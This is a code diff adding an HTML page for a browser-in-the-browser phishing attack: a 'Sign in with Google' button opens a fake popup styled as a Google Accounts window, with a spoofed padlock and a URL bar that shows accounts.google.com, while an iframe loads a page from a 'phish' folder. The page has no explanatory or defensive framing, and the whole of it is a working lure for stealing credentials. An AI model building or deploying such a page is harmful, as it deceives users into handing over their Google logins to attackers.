@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" href="style.css" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <link
+            rel="stylesheet"
+            type="text/css"
+            href="https://cdn.jsdelivr.net/npm/cirrus-ui@0.7.0/dist/cirrus-all.min.css"
+        />
+        <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:400" />
+    </head>
+    <body>
+        <section class="bg-gray-000 h-100p">
+            <div class="content u-center">
+                <div class="clickme" id="clickme">
+                    <div class="icon">
+                        <img
+                            class="icon-svg"
+                            src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg"
+                        />
+                    </div>
+                    <p class="btn-text m-0 u-flex u-items-center"><b>Sign in with Google</b></p>
+                </div>
+            </div>
+
+            <!-- Window -->
+            <div id="window">
+                <div id="title-bar-width">
+                    <div id="title-bar">
+                        <div style="margin-top: 4px;">
+                            <img
+                                src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg"
+                                width="20px"
+                                height="15px"
+                                id="logo"
+                                class="u-inline"
+                            />
+                            <span id="logo-description">Sign in - Gooogle Accounts</span>
+                        </div>
+    
+                        <div class="u-flex">
+                            <span id="minimize">&#8212;</span>
+                            <span id="square">□</span>
+                            <span id="exit">✕</span>
+                        </div>
+                    </div>
+                    <div id="url-bar">
+                        <img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock" />
+                        <span id="domain-name">https://accounts.google.com</span>
+                        <span id="domain-path">/o/oauth2/auth/identifier?response_type=code&client_id=1083004</span>
+                    </div>
+                </div>
+                <!-- Content start -->
+                <iframe id="content" src="../phish/phish2.html" frameborder="0"></iframe>
+            </div>
+        </section>
+    </body>
+    <script src="script.js"></script>
+</html>
